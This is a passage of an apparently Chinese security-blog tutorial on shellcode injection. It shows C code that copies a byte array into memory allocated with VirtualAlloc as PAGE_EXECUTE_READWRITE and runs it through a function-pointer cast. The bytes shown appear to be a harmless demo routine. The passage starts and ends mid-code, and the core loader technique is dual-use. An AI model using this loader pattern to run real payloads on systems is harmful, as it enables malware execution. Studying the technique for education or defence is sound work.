51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xE5</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x5D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC3</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">};</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">typedef</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">(*</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">int</span><span style="color: rgb(51, 51, 51);"> main</span><span style="color: rgb(51, 51, 51);">()</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    PFN_FOO f </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)(</span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">*)</span><span style="color: rgb(51, 51, 51);">data</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    f</span><span style="color: rgb(51, 51, 51);">();</span></span></code></pre></section><p><span style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;">无法执行</span></p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.457286432160804" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/1_ltXGmxy55P2jCEKrwrAAsXvPGCBB0A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWME7qNap1j8v3a7z0P6ElwrfDHcltXGmxy55P2jCEKrwrAAsXvPGCBB0A/640?wx_fmt=png'" data-type="png" data-w="1393" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到可读可写不可执行，修改保存就行了 因为shellcode在程序的全局区，没有可执行权限，代码所在内存必须可读可执行，但是重新编译不行，因为重新编译了就变了，所以还可以在当前程序申请一块可写可读可执行的代码区</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><span style="font-style: italic;">VirtualAlloc</span></strong></p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">LPVOID </span><span style="color: rgb(0, 134, 179);">VirtualAlloc</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">  LPVOID lpAddress</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(150, 152, 150);">// region to reserve or commit</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  SIZE_T dwSize</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">           </span><span style="color: rgb(150, 152, 150);">// size of region</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  DWORD flAllocationType</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">  </span><span style="color: rgb(150, 152, 150);">// type of allocation</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  DWORD flProtect          </span><span style="color: rgb(150, 152, 150);">// type of access protection);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里来申请一块</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">LPVOID lpAddr </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">VirtualAlloc</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//表示任意地址，随机分配</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//内存通常是以分页为单位来给空间 1页=4k 4096字节</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            MEM_COMMIT</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//告诉操作系统给分配一块内存</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            PAGE_EXECUTE_READWRITE</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> NULL</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        printf</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(24, 54, 145);">"Alloc error!"</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5210526315789473" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/2_eIkzZP2yJUqZN7bK4hoicIiaceibkA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWME6cK4KmdfB376zR6sZSmHSSehKDOeIkzZP2yJUqZN7bK4hoicIiaceibkA/640?wx_fmt=png'" data-type="png" data-w="760" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到内存已经申请好了，接下来就把我们的数据拷贝过来，再执行，最后还要释放掉</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">memcpy</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> data</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">data</span><span style="color: rgb(51, 51, 51);">));</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">typedef</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">(*</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">PFN_FOO f </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)(</span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">*)</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">f</span><span style="color: rgb(51, 51, 51);">();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">VirtualFree</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">MEM_DECOMMIT</span><span style="color: rgb(51, 51, 51);">);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">完整代码</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">unsigned</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">char</span><span style="color: rgb(51, 51, 51);"> data</span><span style="color: rgb(51, 51, 51);">[</span><span style="color: rgb(0, 134, 179);">130</span><span style="color: rgb(51, 51, 51);">]</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x40</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x0F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xB7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x08</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x81</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF9</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x5A</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x5F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x03</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x42</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x3C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x89</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x81</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x39</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x50</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 